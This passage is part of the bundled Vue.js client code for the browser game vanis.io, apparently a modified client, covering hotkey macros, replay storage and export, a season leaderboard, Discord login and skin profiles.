            "Quad split": "m-splitMax",
            "32 split": "m-split32",
            "64 split": "m-split64",
            "128 split": "m-split128",
            "256 split": "m-split256",
            "Toggle auto spectate": "toggleAutoSpectate",
            "Diagonal linesplit": "m-linesplit",
            "Lock linesplit": "m-lls",
            "Stop movement": "m-stopMovement",
            Respawn: "m-respawn",
            "Toggle auto respawn": "m-autoRespawn",
            Tricksplit: "m-ts",
            Onesplit: "m-os",
            Linesplit: "m-ls",
            "Self tricksplit": "ts",
            "Self linesplit": "linesplitMacro",
          },
          hotkeys: K.get(),
        }),
        methods: {
          onResetClick: function () {
            X.confirm("Are you sure you want to reset all hotkeys?", () => {
              this.hotkeys = K.reset();
            });
          },
          onMouseDown: function (t, s) {
            if (t.target === document.activeElement) {
              var i = "MOUSE" + t.button;
              K.set(s, i) &&
                (t.preventDefault(), (this.hotkeys[s] = i), t.target.blur());
            }
          },
          onKeyDown: function (t, s) {
            let i = K.convertKey(t.code);
            if ("ESCAPE" === i || "ENTER" === i) {
              t.target.blur();
              return;
            }
            "DELETE" === i && (i = ""),
              K.set(s, i) && ((this.hotkeys[s] = i), t.target.blur());
          },
        },
      },
      ee = (i(178), Object(v.a)(q, J, [], !1, null, "2dbed53e", null)).exports,
      et = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return i("div", { staticClass: "container" }, [
          i("input", {
            ref: "file",
            staticStyle: { display: "none" },
            attrs: { type: "file", accept: ".vanis", multiple: "" },
            on: {
              change: function (s) {
                return t.onFile(s);
              },
            },
          }),
          t._v(" "),
          i("div", { staticClass: "replay-list-header" }, [
            i("span", { staticClass: "replay-list-count" }, [
              t._v(
                t._s(
                  t.keysLoadedFirst
                    ? t.replayKeys.length +
                        " replay" +
                        (1 !== t.replayKeys.length ? "s" : "")
                    : "Loading"
                )
              ),
            ]),
            t._v(" "),
            t.keysLoadedFirst && !t.keysEmpty
              ? i("span", { staticClass: "replay-list-page" }, [
                  i("div", { staticClass: "anchor" }, [
                    i("div", { staticClass: "left" }, [
                      i("div", { staticClass: "current" }, [
                        i("div", { staticClass: "phantom" }, [
                          i("i", {
                            staticClass: "fal fa-chevron-left prev",
                            class: {
                              disabled: !t.keysLoaded || 0 === t.pageIndex,
                            },
                            on: {
                              click: function (s) {
                                return t.updateReplayPage(-1);
                              },
                            },
                          }),
                          t._v(" "),
                          i("span", [t._v(t._s(t.pageCount))]),
                        ]),
                        t._v(" "),
                        t.pageInputShown
                          ? t._e()
                          : i(
                              "div",
                              {
                                staticClass: "real",
                                on: {
                                  click: function (s) {
                                    return t.togglePageInput(!0);
                                  },
                                },
                              },
                              [i("span", [t._v(t._s(1 + t.pageIndex))])]
                            ),
                        t._v(" "),
                        t.pageInputShown
                          ? i("div", { staticClass: "real-input" }, [
                              i("div", {
                                staticClass: "overlay",
                                on: {
                                  click: function (s) {
                                    return t.togglePageInput(!1);
                                  },
                                },
                              }),
                              t._v(" "),
                              i("i", {
                                staticClass: "fal fa-chevron-left prev",
                                class: {
                                  disabled: !t.keysLoaded || 0 === t.pageIndex,
                                },
                                on: {
                                  click: function (s) {
                                    return t.updateReplayPage(-1);
                                  },
                                },
                              }),
                              t._v(" "),
                              i("input", {
                                attrs: { type: "text" },
                                domProps: { value: 1 + t.pageIndex },
                                on: {
                                  focus: function (t) {
                                    return t.target.select();
                                  },
                                  change: function (s) {
                                    return t.updateReplayPage(s);
                                  },
                                },
                              }),
                            ])
                          : t._e(),
                      ]),
                    ]),
                    t._v("\n                /\n                "),
                    i("div", { staticClass: "right" }, [
                      t._v(
                        "\n                    " +
                          t._s(t.pageCount) +
                          "\n                    "
                      ),
                      i("i", {
                        staticClass: "fal fa-chevron-right next",
                        class: {
                          disabled:
                            !t.keysLoaded || t.pageIndex === t.pageCount - 1,
                        },
                        on: {
                          click: function (s) {
                            return t.updateReplayPage(1);
                          },
                        },
                      }),
                    ]),
                  ]),
                ])
              : t._e(),
            t._v(" "),
            i("span", { staticClass: "replay-list-bulk" }, [
              i("input", {
                staticClass: "vanis-button",
                attrs: {
                  type: "button",
                  disabled: !t.keysLoaded,
                  value: "Import",
                },
                on: {
                  click: function (s) {
                    return t.$refs.file.click();
                  },
                },
              }),
              t._v(" "),
              i("input", {
                staticClass: "vanis-button",
                attrs: {
                  type: "button",
                  disabled: !t.keysLoaded || t.keysEmpty,
                  value: "Download all",
                },
                on: {
                  click: function (s) {
                    return t.downloadAllReplays();
                  },
                },
              }),
              t._v(" "),
              i("input", {
                staticClass: "vanis-button",
                attrs: {
                  type: "button",
                  disabled: !t.keysLoaded || t.keysEmpty,
                  value: "Delete all",
                },
                on: {
                  click: function (s) {
                    return t.deleteAllReplays();
                  },
                },
              }),
            ]),
          ]),
          t._v(" "),
          i(
            "div",
            { staticClass: "replay-list" },
            [
              t.keysLoadedFirst && t.keysEmpty
                ? [
                    i("div", { staticClass: "notification" }, [
                      i("div", [
                        t._v("Press "),
                        i("b", [t._v(t._s(t.messageHotkey))]),
                        t._v(" in game to save last "),
                        i("b", [t._v(t._s(t.messageReplayDuration))]),
                        t._v(" seconds of gameplay."),
                      ]),
                      t._v(" "),
                      i(
                        "div",
                        {
                          staticStyle: { color: "red", "font-weight": "bold" },
                        },
                        [t._v("Replays are saved in browser memory!")]
                      ),
                      t._v(" "),
                      i("div", [
                        t._v(
                          "They get permanently erased if browser data gets cleared."
                        ),
                      ]),
                    ]),
                  ]
                : t._e(),
              t._v(" "),
              t.keysLoadedFirst && !t.keysEmpty
                ? [
                    i(
                      "div",
                      { staticClass: "replay-page" },
                      t._l(t.pageData, function (t, s) {
                        return i("replay-item", {
                          key: s,
                          attrs: { replay: t },
                        });
                      }),
                      1
                    ),
                  ]
                : t._e(),
            ],
            2
          ),
          t._v(" "),
          t.bulkOperating
            ? i("div", { staticClass: "overlay bulk-operation-overlay" }, [
                t._v("\n        Please wait...\n        "),
                t.bulkOperationStatus
                  ? i("div", { staticClass: "small" }, [
                      t._v(t._s(t.bulkOperationStatus)),
                    ])
                  : t._e(),
                t._v(" "),
                t.showMultipleFilesWarning
                  ? i("div", { staticClass: "small warning" }, [
                      t._v("Allow page to download multiple files if asked"),
                    ])
                  : t._e(),
              ])
            : t._e(),
        ]);
      };
    et._withStripped = !0;
    var es = i(113),
      ei = i(86),
      ea = i(180),
      en = i(1),
      eo = i(65),
      er = i(4),
      el = i(5),
      ec = i(8),
      eh = en.replay.database,
      ed = {
        data: () => ({
          keysLoadedFirst: !1,
          keysLoaded: !1,
          keysLoading: !1,
          keysEmpty: !1,
          replayKeys: [],
          pageInputShown: !1,
          pageLoadingCancel: null,
          pageLoaded: !1,
          pageIndex: 0,
          pageCount: 0,
          pageData: [],
          bulkOperating: !1,
          bulkOperationStatus: "",
          showMultipleFilesWarning: !1,
          messageHotkey: eo.get().saveReplay,
          messageReplayDuration: er.replayDuration,
        }),
        components: { replayItem: es.default },
        methods: {
          togglePageInput(t) {
            this.pageInputShown = t;
          },
          setBulkOp(t, s) {
            t
              ? ((this.bulkOperating = !0),
                (this.bulkOperationStatus = s || ""))
              : setTimeout(() => {
                  (this.bulkOperating = !1), (this.bulkOperationStatus = "");
                }, 1e3);
          },
          async onFile(t) {
            if (!this.bulkOperating) {
              var s = Array.from(t.target.files);
              if (s.length) {
                t.target && (t.target.value = null);
                var i = 0,
                  a = s.length,
                  n = s.map(async (t) => {
                    var s, n;
                    await eh.setItem(
                      t.name.replace(/\.vanis$/, ""),
                      await ((s = t),
                      new Promise((t, i) => {
                        var a = new FileReader();
                        (a.onload = (s) => t(s.target.result)),
                          (a.onerror = i),
                          a.readAsText(s);
                      }))
                    ),
                      this.setBulkOp(
                        !0,
                        "Importing replays (" + ++i + " / " + a + ")"
                      );
                  });
                this.setBulkOp(!0, "Importing replays");
                try {
                  await Promise.all(n);
                } catch (o) {
                  el.alert('Error importing replays: "' + o.message + '"'),
                    this.setBulkOp(!1),
                    this.updateReplayKeys();
                }
                this.setBulkOp(!1), this.updateReplayKeys();
              }
            }
          },
          async downloadAllReplays() {
            if (!this.bulkOperating && this.keysLoaded) {
              var t = this.replayKeys.length,
                s = Math.ceil(this.replayKeys.length / 200),
                i = s > 1,
                a = ec.getTimestamp();
              (this.showMultipleFilesWarning = i),
                this.setBulkOp(!0, "Packing replays (0 / " + s + ")");
              for (var n = 0, o = 0; n < t; n += 200, o++) {
                for (var r = new ea(), l = n; l < n + 200 && l < t; l++) {
                  var c = this.replayKeys[l],
                    h = eh.getItem(c);
                  r.file(`${c}.vanis`, h);
                }
                var d = await r.generateAsync({ type: "blob" }),
                  u = "replays_" + a;
                i && (u += "_" + (o + 1)),
                  (u += ".zip"),
                  ei.saveAs(d, u),
                  this.setBulkOp(
                    !0,
                    "Packing replays (" + (o + 1) + " / " + s + ")"
                  );
              }
              (this.showMultipleFilesWarning = !1), this.setBulkOp(!1);
            }
          },
          deleteAllReplays() {
            if (!this.bulkOperating) {
              var t = this;
              el.confirm(
                "Are you absolutely sure that you want to delete all replays?",
                async () => {
                  this.setBulkOp(!0, "Deleting all replays");
                  try {
                    await eh.clear();
                  } catch (s) {
                    return void el.alert(
                      "Error clearing replays: " + s.message
                    );
                  }
                  this.setBulkOp(!1), t.updateReplayKeys();
                }
              );
            }
          },
          async updateReplayKeys() {
            if (!this.keysLoading) {
              (this.keysLoaded = !1), (this.keysLoading = !0);
              var t = await eh.keys();
              (t = t.reverse()),
                this.replayKeys.splice(0, this.replayKeys.length, ...t),
                (this.pageCount = Math.max(Math.ceil(t.length / 12), 1)),
                (this.pageIndex = Math.min(this.pageIndex, this.pageCount - 1)),
                (this.keysLoaded = !0),
                (this.keysLoadedFirst = !0),
                (this.keysLoading = !1),
                (this.keysEmpty = 0 === t.length),
                await this.updateReplayPage();
            }
          },
          async updateReplayPage(t) {
            t &&
              ("number" == typeof t
                ? (this.pageIndex += t)
                : (this.pageIndex = parseInt(t.target.value) - 1 || 0)),
              this.pageLoadingCancel &&
                (this.pageLoadingCancel(), (this.pageLoadingCancel = null));
            var s = Math.max(Math.min(this.pageIndex, this.pageCount - 1), 0);
            this.pageIndex !== s && (this.pageIndex = s),
              (this.pageLoaded = !1);
            var i = [],
              a = !1;
            this.pageLoadingCancel = () => (a = !0);
            for (
              var n = 12 * this.pageIndex, o = 12 * (1 + this.pageIndex), r = n;
              r < o && r < this.replayKeys.length && !a;
              r++
            ) {
              var l = this.replayKeys[r],
                c = { name: l, data: await eh.getItem(l) };
              c.data.startsWith("REPLAY")
                ? (c.image = c.data.split("|")[2])
                : (c.image = "https://vanis.io/img/replay-placeholder.png"),
                i.push(c);
            }
            a ||
              (this.pageData.splice(0, this.pageData.length, ...i),
              (this.pageLoaded = !0));
          },
        },
        created() {
          this.updateReplayKeys(),
            en.events.$on("replay-added", this.updateReplayKeys),
            en.events.$on("replay-removed", this.updateReplayKeys);
        },
        beforeDestroy() {
          en.events.$off("replay-added", this.updateReplayKeys),
            en.events.$off("replay-removed", this.updateReplayKeys);
        },
      },
      eu = (i(220), Object(v.a)(ed, et, [], !1, null, "4a996e52", null))
        .exports,
      ep = function () {
        var t = this,
          s = t._self._c || t.$createElement;
        return s("div", { staticStyle: { padding: "15px" } }, [
          s("h2", { staticStyle: { margin: "0", "margin-bottom": "14px" } }, [
            t._v(t._s(t.seasonLeaderboardText)),
          ]),
          t._v(" "),
          t.errorMessage
            ? s("div", [
                t._v(
                  "\n        Failed loading season leaderboard data:\n        " +
                    t._s(t.errorMessage) +
                    "\n    "
                ),
              ])
            : t._e(),
          t._v(" "),
          t.playerList.length
            ? s(
                "div",
                [
                  s("div", { staticStyle: { "margin-bottom": "14px" } }, [
                    t._v(
                      "\n            Season XP counts for this season only."
                    ),
                    s("br"),
                    t._v("\n            Top few players earn colored names."),
                    s("br"),
                    t._v("\n            Season ends in "),
                    s("b", [t._v(t._s(t.seasonEndTime))]),
                  ]),
                  t._v(" "),
                  t._l(t.playerList, function (i, a) {
                    return s(
                      "div",
                      {
                        key: a,
                        staticClass: "player-row",
                        class: { me: t.ownUid && t.ownUid === i.uid },
                      },
                      [
                        s("span", { staticClass: "player-nr" }, [
                          t._v(t._s(a + 1) + "."),
                        ]),
                        t._v(" "),
                        s(
                          "span",
                          {
                            staticClass: "player-name",
                            style: { color: i.name_color },
                          },
                          [t._v(t._s(i.name))]
                        ),
                        t._v(" "),
                        s("span", { staticClass: "player-xp" }, [
                          t._v(t._s(i.season_xp) + " XP"),
                        ]),
                      ]
                    );
                  }),
                ],
                2
              )
            : t._e(),
        ]);
      };
    ep._withStripped = !0;
    let eg = [
      "Jan",
      "Feb",
      "Mar",
      "Apr",
      "May",
      "Jun",
      "Jul",
      "Aug",
      "Sep",
      "Oct",
      "Nov",
      "Dec",
    ];
    function em(t) {
      if (t < 0) return "now";
      var s = Math.floor(t / 1e3),
        i = s % 60,
        a = Math.floor(s / 60),
        n = a % 60,
        o = Math.floor(a / 60),
        r = o % 24,
        l = Math.floor(o / 24),
        c = [];
      return (
        l > 0 && c.push(l + " day" + (1 !== l ? "s" : "")),
        r % 24 > 0 && c.push(r + " hour" + (1 !== r ? "s" : "")),
        0 === l && n % 60 > 0 && c.push(n + " minute" + (1 !== n ? "s" : "")),
        0 === o && i % 60 > 0 && c.push(i + " second" + (1 !== i ? "s" : "")),
        c.join(" ")
      );
    }
    var eA = i(1),
      ef = i(15),
      { checkBadWords: eC } = i(18),
      ev = {
        data: () => ({
          playerList: [],
          errorMessage: "",
          ownUid: null,
          date: new Date(),
          nextStartDate: Date.UTC(
            new Date().getUTCFullYear(),
            new Date().getUTCMonth() + 1
          ),
          seasonEndTime: null,
        }),
        computed: {
          seasonLeaderboardText() {
            return `${
              eg[this.date.getUTCMonth()]
            } ${this.date.getUTCFullYear()} season`;
          },
        },
        methods: {
          updateSeasonEndTime() {
            this.seasonEndTime = em(this.nextStartDate - Date.now());
          },
        },
        created() {
          (this.ownUid = eA.ownUid),
            ef
              .get("https://vanis.io/api/leaderboard/season_xp/100")
              .then((t) => {
                let s = t.data;
                s.forEach((t) => {
                  let s = t.perk_color;
                  t.name_color = s ? `#${s}` : "white";
                  let i = t.perk_name || t.discord_name;
                  eC(i) && (i = i.replace(/.*/g, "*")), (t.name = i);
                }),
                  (this.playerList = s);
              })
              .catch((t) => {
                this.errorMessage = t.message;
              }),
            eA.events.$on("every-second", this.updateSeasonEndTime),
            this.updateSeasonEndTime();
        },
        destroyed() {
          eA.events.$off("every-second", this.updateSeasonEndTime);
        },
      },
      ew = (i(222), Object(v.a)(ev, ep, [], !1, null, "7cb607ba", null))
        .exports,
      d = (i(15), i(1)),
      ey =
        (i(5),
        {
          components: {
            modal: $.default,
            settings: U,
            theming: W,
            hotkeys: ee,
            replays3: eu,
            seasonLeaderboard: ew,
          },
          data: () => ({
            activeModal: "",
            showSettings: !1,
            showHotkeys: !1,
            gameState: d.state,
            nickname:
              "string" == typeof localStorage.nickname
                ? localStorage.nickname
                : "",
            teamtag: localStorage.teamtag || "",
            skinUrl:
              "string" == typeof localStorage.skinUrl
                ? localStorage.skinUrl
                : "https://skins.vanis.io/s/vanis1",
            debounce: !1,
          }),
          created() {
            d.events.$on("profile-selected", (t) => {
              (this.nickname = t.name),
                (this.teamtag = t.tag),
                (this.skinUrl = t.skinUrl),
                localStorage.setItem("skinUrl", t.skinUrl),
                localStorage.setItem("nickname", t.name),
                localStorage.setItem("teamtag", t.tag);
            });
          },
          methods: {
            openModal(t) {
              (this.activeModal = t), this.$emit("modal-open", !0);
            },
            closeModal() {
              (this.activeModal = ""), this.$emit("modal-open", !1);
            },
            play(t) {
              if (t.isTrusted) {
                if (d.connection.active)
                  d.state.isAlive || d.actions.spawn(), d.showMenu(!1);
                else if (!this.debounce) {
                  (this.debounce = !0),
                    setTimeout(() => {
                      this.debounce = !1;
                    }, 3e3),
                    (d.startAction = 1);
                  let s = this.gameState.selectedServer;
                  if (!s) {
                    setStatus("No selected server?");
                    return;
                  }
                  d.connection.start(s.url);
                }
              }
            },
            spectate(t) {
              if (t.isTrusted) {
                if (d.connection.active) d.actions.spectate(), d.showMenu(!1);
                else if (!this.debounce) {
                  (this.debounce = !0),
                    setTimeout(() => {
                      this.debounce = !1;
                    }, 3e3),
                    (d.startAction = 2);
                  let s = this.gameState.selectedServer;
                  if (!s) {
                    setStatus("No selected server?");
                    return;
                  }
                  d.connection.start(s.url);
                }
              }
            },
            onSkinUrlChange() {
              d.events.$emit("skin-url-changed", this.skinUrl);
            },
            onTeamTagChange() {
              localStorage.setItem("teamtag", this.teamtag),
                d.events.$emit("tag-changed", this.teamtag);
            },
            onNicknameChange() {
              localStorage.setItem("nickname", this.nickname),
                d.events.$emit("nickname-changed", this.nickname);
            },
          },
        }),
      eI = (i(224),
      Object(v.a)(
        ey,
        I,
        [
          function () {
            return (this._self._c || this.$createElement)("div", {}, []);
          },
        ],
        !1,
        null,
        "1bcde71e",
        null
      )).exports,
      e$ = function () {
        let t = this,
          s = t._self._c || t.$createElement;
        return s("div", { staticStyle: { padding: "17px" } }, [
          t.account
            ? t._e()
            : s("div", [
                s(
                  "div",
                  {
                    staticStyle: {
                      "margin-top": "6px",
                      "margin-bottom": "10px",
                    },
                  },
                  [
                    t._v(
                      "Login to your account with Discord to save your in-game progress."
                    ),
                  ]
                ),
                t._v(" "),
                s(
                  "div",
                  {
                    staticClass: "discord",
                    on: {
                      click: function (s) {
                        return t.openDiscordLogin();
                      },
                    },
                  },
                  [
                    t.loading
                      ? [
                          t.loading
                            ? s("i", {
                                staticClass: "fal fa-sync fa-spin",
                                staticStyle: { "margin-right": "5px" },
                              })
                            : t._e(),
                          t._v(" Loading"),
                        ]
                      : [
                          s("i", { staticClass: "fab fa-discord" }),
                          t._v(" Login with Discord"),
                        ],
                  ],
                  2
                ),
              ]),
          t._v(" "),
          t.account
            ? s("div", { staticClass: "account" }, [
                s("div", { staticStyle: { "margin-bottom": "3px" } }, [
                  s("img", {
                    staticClass: "avatar",
                    attrs: { src: t.avatarUrl },
                    on: {
                      error(t) {
                        t.target.src =
                          "https://cdn.discordapp.com/embed/avatars/0.png";
                      },
                    },
                  }),
                  t._v(" "),
                  s("div", { staticClass: "player-info" }, [
                    s(
                      "div",
                      {
                        style: { color: t.nameColor },
                        attrs: { id: "account-name" },
                      },
                      [
                        t._v(
                          t._s(localStorage.streamerMode ? "Streamer" : t.name)
                        ),
                      ]
                    ),
                    t._v(" "),
                    s("div", [t._v("Level " + t._s(t.account.level))]),
                    t._v(" "),
                    s("div", [t._v(t._s(t.account.xp) + " Total XP")]),
                    t._v(" "),
                    s("div", [
                      t._v(t._s(t.account.season_xp || 0) + " Season XP"),
                    ]),
                  ]),
                ]),
                t._v(" "),
                s(
                  "div",
                  { staticStyle: { position: "relative" } },
                  [
                    s("progress-bar", { attrs: { progress: t.progress } }),
                    t._v(" "),
                    s("div", { staticClass: "xp-data" }, [
                      s(
                        "div",
                        { staticStyle: { flex: "1", "margin-left": "8px" } },
                        [t._v(t._s(t.xpAtCurrentLevel))]
                      ),
                      t._v(" "),
                      s("div", { staticStyle: { "margin-right": "7px" } }, [
                        t._v(t._s(t.xpAtNextLevel)),
                      ]),
                    ]),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  {
                    staticClass: "logout",
                    on: {
                      click: function (s) {
                        return t.logout();
                      },
                    },
                  },
                  [
                    s("i", { staticClass: "fal fa-sign-out-alt" }),
                    t._v(" Logout"),
                  ]
                ),
              ])
            : t._e(),
        ]);
      };
    e$._withStripped = !0;
    var ek = function () {
      var t = this.$createElement,
        s = this._self._c || t;
      return s("div", { staticClass: "progress-bar" }, [
        s("div", {
          staticClass: "progress",
          style: { width: 100 * this.progress + "%" },
        }),
      ]);
    };
    ek._withStripped = !0;
    var eb =
      (i(226),
      Object(v.a)({ props: ["progress"] }, ek, [], !1, null, "4e838c74", null));
    eb.options.__file = "src/components/progressBar.vue";
    var eS = eb.exports,
      m = i(145),
      ex = i(228),
      e_ = i(1),
      eE = i(229),
      u = i(5),
      eB = {
        components: { progressBar: eS },
        data: () => ({
          lastUpdateTime: 0,
          account: null,
          progress: 0,
          xpAtCurrentLevel: 0,
          xpAtNextLevel: 0,
          loading: !1,
          avatarUrl: null,
          nameColor: null,
          name: null,
          initial: !1,
        }),
        created() {
          e_.events.$on("menu-opened", this.reloadUserData),
            e_.events.$on("every-minute", this.reloadUserData),
            e_.events.$on("xp-update", this.onXpUpdate),
            this.reloadUserData(),
            this.listenForToken();
        },
        beforeDestroy() {
          e_.events.$off("xp-update", this.onXpUpdate);
        },
        methods: {
          listenForToken() {
            window.addEventListener("message", (t) => {
              let s = t.data.vanis_token;
              s &&
                (this.onLoggedIn(s),
                t.source.postMessage("loggedIn", t.origin));
            });
          },
          reloadUserData() {
            let t = Date.now() - this.lastUpdateTime;
            t >= 6e4 &&
              ((this.lastUpdateTime = Date.now()),
              ex.token ? this.loadUserData() : this.updateUserData());
          },
          updateUserData(t) {
            let s = t || {
              discord_name: "Guest",
              avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
            };
            m(s, null, 4),
              this.initial || (m(null, null, 3), (this.initial = !0));
          },
          async loadUserData() {
            this.loading = !0;
            let t = await ex.get("/me").catch((t) => {
              this.loading = !1;
              let { response: s } = t;
              s &&
                (401 === s.status ||
                  s.data?.error === "Invalid session token") &&
                (u.toast.fire({
                  title: "You have been logged out",
                  type: "info",
                  timer: 3e3,
                }),
                ex.clearToken());
            });
            t &&
              (this.setAccountData(t),
              this.updateProgress(this.account.xp, this.account.level),
              (this.loading = !1)),
              this.updateUserData(t);
          },
          async logout() {
            await ex.call("DELETE", "/me").catch((t) => {
              setStatus("Logout failed:", t.response?.message),
                t.response?.status !== 401 &&
                  setStatus("Logout failed?", t.response?.message);
            }),
              ex.clearToken(),
              (this.account = null),
              (this.name = null),
              (this.nameColor = null),
              (this.avatarUrl = null),
              (e_.ownUid = null);
          },
          getAvatar: (t, s) =>
            s
              ? `https://cdn.discordapp.com/avatars/${t}/${s}`
              : "https://cdn.discordapp.com/embed/avatars/0.png",
          setAccountData(t) {
            (this.account = t),
              (this.avatarUrl = t.avatar_url =
                this.getAvatar(
                  t.discord_id,
                  localStorage.streamerMode || t.discord_avatar
                )),
              (this.name = t.locked_name || t.discord_name),
              (this.nameColor = `#${t.name_color || "ffffff"}`),
              (e8.ownUid = t.uid),
              localStorage.streamerMode &&
                ((t.xp = 0), (t.season_xp = 0), (t.level = 0));
          },
          onXpUpdate(t) {
            if (this.account && !localStorage.streamerMode) {
              let s = eE.getLevel(t);
              (this.account.season_xp += t - this.account.xp),
                (this.account.xp = t),
                (this.account.level = s),
                this.updateProgress(t, s);
            }
          },
          updateProgress(t, s) {
            localStorage.streamerMode && ((t = 0), (s = 0)),
              (this.xpAtCurrentLevel = eE.getXp(s)),
              (this.xpAtNextLevel = eE.getXp(s + 1)),
              (this.progress =
                (t - this.xpAtCurrentLevel) /
                (this.xpAtNextLevel - this.xpAtCurrentLevel));
          },
          openDiscordLogin() {
            let t = `${ex.baseUrl}/login/discord`;
            window.open(t, "", "width=500, height=750");
          },
          onLoggedIn(t) {
            ex.setToken(t), this.loadUserData();
          },
        },
      },
      eM = (i(230), Object(v.a)(eB, e$, [], !1, null, "661435cd", null))
        .exports,
      e8 = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return i("div", { attrs: { id: "skins-container" } }, [
          i(
            "div",
            { attrs: { id: "skins" } },
            [
              t._l(t.skins, function (s, a) {
                return i("span", { key: a, staticClass: "skin-container" }, [
                  i("img", {
                    staticClass: "skin",
                    class: { selected: t.selectedProfileIndex === a },
                    attrs: { src: s, alt: "" },
                    on: {
                      error(t) {
                        (t.target.src = getImageUrl("bad-skin")),
                          (t.target.id = "bad-skin");
                      },
                      click: function (s) {
                        return t.select(a);
                      },
                      contextmenu: function (s) {
                        return t.remove(a);
                      },
                    },
                  }),
                  t._v(" "),
                  i("i", {
                    staticClass: "fal fa-times skin-remove-button",
                    on: {
                      click: function (s) {
                        return t.remove(a);
                      },
                    },
                  }),
                ]);
              }),
              t._v(" "),
              i("img", {
                staticClass: "skin add-skin",
                attrs: { src: "/img/skin-add.png", alt: "" },
                on: {
                  click: function (s) {
                    return t.add();
                  },
                },
              }),
            ],
            2
          ),
        ]);
      };
    e8._withStripped = !0;
    var e0 = i(1),
      eQ = {
        data: () => ({ selectedProfileIndex: 0, skins: [] }),
        created: function () {
          e0.events.$on("skin-url-changed", this.onSkinUrlChanged),
            e0.events.$on("tag-changed", this.onTeamTagChange),
            e0.events.$on("nickname-changed", this.onNicknameChange),
            (this.skins = this.loadSkins() || this.getDefaultSkins()),
            (this.profiles = this.loadProfiles() || this.getDefaultProfiles()),
            (e0.skins = this.skins);
          let t = +localStorage.selectedProfileIndex || 0;
          this.select(t);
        },
        methods: {
          saveSkins() {
            localStorage.modSkins = JSON.stringify(this.skins);
          },
          saveProfiles() {
            localStorage.setItem("modProfiles", JSON.stringify(this.profiles));
          },
          onTeamTagChange(t) {
            let s = this.profiles[this.selectedProfileIndex];
            this.$set(this.profiles, this.selectedProfileIndex, {
              ...s,
              tag: t,
            }),
              this.saveProfiles();
          },
          onNicknameChange(t) {
            let s = this.profiles[this.selectedProfileIndex];
            this.$set(this.profiles, this.selectedProfileIndex, {
              ...s,
              name: t,
            }),
              this.saveProfiles();
          },
          loadSkins() {
            let t = JSON.parse(localStorage.getItem("modSkins"));
            if (
              (Array.isArray(t) ||
                (t = JSON.parse(localStorage.getItem("skins"))),
              !Array.isArray(t))
            )
              return setStatus("Failed to parse saved skins"), null;
            for (let s = t.length; s < 2; s++)
              t.push("https://skins.vanis.io/s/vanis1");
            return t;
          },
          getDefaultSkins() {
            let t = [];
            for (let s = 0; s < 8; s++)
              t.push("https://skins.vanis.io/s/vanis1");
            return t;
          },
          loadProfiles() {
            let t = JSON.parse(localStorage.getItem("modProfiles"));
            if (!Array.isArray(t))
              return setStatus("Failed to parse saved profiles"), null;
            if (this.skins.length > t.length) {
              setStatus("Fixing profile length oddity");
              let s = this.skins.length - t.length;
              for (let i = 0; i < s; i++) t.push({ name: "Unnamed", tag: "" });
            }
            return t;
          },
          getDefaultProfiles() {
            let t = [];
            for (let s = 0; s < this.skins.length; s++)
              t.push({
                name:
                  "string" == typeof localStorage.nickname
                    ? localStorage.nickname
                    : "",
                tag: localStorage.teamtag || "",
              });
            return t;
          },
          onSkinUrlChanged(t) {
            this.$set(this.skins, this.selectedProfileIndex, t),
              this.saveSkins();
          },
          select(t) {
            (this.selectedProfileIndex = t),
              localStorage.setItem("selectedProfileIndex", t),
              e0.events.$emit("profile-selected", {
                ...this.profiles[t],
                skinUrl: this.skins[t],
              });
          },
          remove(t) {
            this.skins.splice(t, 1),
              this.profiles.splice(t, 1),
              this.skins.length < 2 &&
                (this.skins.push("https://skins.vanis.io/s/vanis1"),
                this.profiles.push({ name: "Unnamed", tag: "" })),
              this.saveSkins(),
              this.saveProfiles();
            let s = Math.max(0, this.selectedProfileIndex - 1);
            this.select(s);
          },
          add() {
            let t = this.skins.length;
            this.skins.push("https://skins.vanis.io/s/vanis1"),
              this.profiles.push({ name: "Unnamed", tag: "" }),
              this.select(t),
              this.saveSkins(),
              this.saveProfiles();
          },
        },
      },
      eU = (i(232), Object(v.a)(eQ, e8, [], !1, null, "1c614894", null))
        .exports,
      eN = i(1),
      eT = {
        data: () => ({
          isModalOpen: !1,
          selectedTab: "servers",
          gameState: eN.state,
          cursorStyleElem: null,
        }),
        methods: {
          onModalChange: function (t) {
            this.isModalOpen = t;
          },
          setCursorUrl(t) {
            var s = null;
            t &&
              (s =
                "#canvas, #hud > * { cursor: url('" +
                t +
                "'), auto !important; }"),
              !s && this.cursorStyleElem
                ? (this.cursorStyleElem.remove(), (this.cursorStyleElem = null))
                : s &&
                  !this.cursorStyleElem &&
                  ((this.cursorStyleElem = document.createElement("style")),
                  document.head.appendChild(this.cursorStyleElem)),
              this.cursorStyleElem && (this.cursorStyleElem.innerHTML = s);
          },
        },
        components: { servers: w, playerContainer: eI, account: eM, skins: eU },
        created() {
          eN.events.$on("set-cursor-url", (t) => this.setCursorUrl(t));
        },
        mounted() {
          this.setCursorUrl(eN.settings.cursorImageUrl);
        },
      },
      eL = (i(234), Object(v.a)(eT, l, [], !1, null, "ebed1606", null)).exports,
      eD = function () {
        var t = this;
        return t.$createElement, t._self._c, t._m(0);
      };
    (eD._withStripped = !0), i(236);
    var eR = Object(v.a)(
        {},
        eD,
        [
          function () {
            var t = this.$createElement,
              s = this._self._c || t;
            return s("div", { staticClass: "social-container" }, [
              s(
                "a",
                {
                  staticClass: "discord-link",
                  attrs: {
                    href: "https://bit.ly/axon-discord",
                    target: "_blank",
                  },
                },
                [
                  s("i", { staticClass: "fab fa-discord" }),
                  this._v(" Official Discord\n    "),
                ]
              ),
              this._v(" "),
              s(
                "a",
                {
                  staticClass: "tournaments-link",
                  attrs: {
                    href: "https://vanis.io/tournaments",
                    target: "_blank",
                  },
                },
                [
                  s("i", { staticClass: "fal fa-trophy" }),
                  this._v(" Tournaments\n    "),
                ]
              ),
              this._v(" "),
              s(
                "a",
                {
                  staticClass: "youtube-link",
                  attrs: {
                    href: "https://www.youtube.com/channel/UCTAoyE3O7wop1gJcMo9UtVQ",
                    target: "_blank",
                  },
                },
                [
                  s("i", { staticClass: "fab fa-youtube" }),
                  this._v(" YouTube\n    "),
                ]
              ),
              this._v(" "),
              s(
                "a",
                {
                  attrs: {
                    href: "https://skins.vanis.io",
                    target: "_blank",
                    id: "skins-link",
                  },
                },
                [
                  s("i", { staticClass: "fal fa-images" }),
                  this._v(" Skins\n    "),
                ]
              ),
            ]);
          },
        ],
        !1,
        null,
        "4d0670e9",
        null
